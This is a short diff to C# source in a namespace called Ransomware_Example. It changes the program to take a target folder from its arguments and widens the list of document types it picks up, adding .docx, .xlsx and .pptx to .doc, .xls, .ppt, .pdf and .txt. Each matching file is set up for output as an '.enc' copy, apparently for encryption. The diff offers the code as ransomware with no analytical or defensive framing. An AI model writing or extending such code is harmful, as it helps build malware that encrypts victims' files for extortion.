@@ -2,6 +2,7 @@
 using System.IO;
 using System.Text;
 using System.Security.Cryptography;
+using System.Collections.Generic;
 
 namespace Ransomware_Example
 {
@@ -11,10 +12,10 @@ namespace Ransomware_Example
         {
             try
             {
-				string [] fileEntries = Directory.GetFileSystemEntries (System.IO.Directory.GetCurrentDirectory());
-				foreach (string fileName in fileEntries)
+				string[] files = Directory.GetFiles(@args[0]);
+				foreach (string fileName in files)
 				{
-					if (fileName.Contains(".doc") || fileName.Contains(".xls") || fileName.Contains(".ppt") || fileName.Contains(".pdf") || fileName.Contains(".txt"))
+					if (fileName.Contains(".doc") || fileName.Contains(".xls") || fileName.Contains(".xlsx") || fileName.Contains(".docx") || fileName.Contains(".pptx") ||  fileName.Contains(".ppt") || fileName.Contains(".pdf") || fileName.Contains(".txt"))
 					{
 						var InFileName = fileName;
 						var OutFileName = InFileName + ".enc";
